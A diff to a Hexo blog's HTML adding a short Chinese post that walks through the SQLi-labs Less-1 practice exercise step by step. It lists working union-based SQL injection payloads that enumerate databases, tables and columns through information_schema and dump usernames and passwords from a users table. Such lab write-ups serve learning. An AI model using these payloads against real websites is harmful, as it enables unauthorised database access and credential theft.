@@ -151,6 +151,87 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/28/01/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/28/01/" class="post-title-link" itemprop="url">1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-28 21:19:38" itemprop="dateCreated datePublished" datetime="2022-01-28T21:19:38+08:00">2022-01-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-25 21:45:52" itemprop="dateModified" datetime="2022-02-25T21:45:52+08:00">2022-02-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="less-01的学习"><a href="#less-01的学习" class="headerlink" title="less 01的学习"></a>less 01的学习</h2><p>less 1</p>
+<p>1.先输入?id=1，发现回显正常。</p>
+<p>再输入?id=1’,发现系统进行报错，且发现错因是引号，所以位字符型注入。</p>
+<p>2.输入order by语句对题目的列数进行猜测（这里我们用到二分法进行判断）</p>
+<p>可知列数为3.————?id=1’ order by 3–+ </p>
+<p>3.用id=-1；来使数据库进行报错，并加入union select 1,2,3, –+语句进行顶替</p>
+<p>————?id=-1’ union select 1,2,3–+</p>
+<p>使显示位显示的数据为username：2，password：3。</p>
+<p>4.选择username或password的位置进行显示我们要查询的数据。</p>
+<p>用语句————?id=-1’ union select 1,2,group_concat(schema_name)from information_schema.schemata–+</p>
+<p>查询显示出好几个库名 选择security作为查询对象。</p>
+<p>或者用语句————?id=-1’ union select 1,2,database()–+进行查询，结果为security</p>
+<p>5.查询表中数据</p>
+<p>?id=-1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=’security’ –+</p>
+<p>6.查询列中的数据</p>
+<p>?id=-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name=’users’–+</p>
+<p>7.查询username和password数据?id=-1’ union select 1,2,group_concat(concat_ws(‘~’,username,password)) from security.users–+</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/sql%E5%87%BD%E6%95%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -369,7 +450,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">2</span>
+          <span class="site-state-item-count">3</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
